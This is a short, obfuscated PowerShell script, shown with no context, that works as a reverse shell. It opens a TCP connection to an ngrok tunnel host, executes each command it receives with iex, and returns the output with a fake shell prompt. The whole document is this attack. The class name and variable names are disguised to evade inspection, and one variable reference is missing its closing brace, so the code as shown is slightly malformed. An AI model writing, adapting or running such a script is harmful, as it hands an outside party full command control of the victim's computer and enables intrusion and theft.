$__='S'+'y'+'s'+'t'+'e'+'m'+'.'+'N'+'e'+'t'+'.'+'S'+'o'+'c'+'k'+'e'+'t'+'s'+'.'+'T'+'C'+'P'+'C'+'l'+'i'+'e'+'n'+'t';$___='0.tcp.ap.ngrok.io';$____=14636;
${_}=New-Object $__(${___},${____);${__}=${_}.GetStream();[byte[]]${___}=0..65535|%{0};
while((${____}=${__}.Read(${___},0,${___}.Length))-ne 0){${_____}=(New-Object Text.ASCIIEncoding).GetString(${___},0,${____});
${______}=(iex ${_____} 2>&1 | Out-String ) + 'PS ' + (pwd).Path + '> ';
${_______}=([text.encoding]::ASCII).GetBytes(${______});${__}.Write(${_______},0,${_______}.Length);${__}.Flush()};${_}.Close()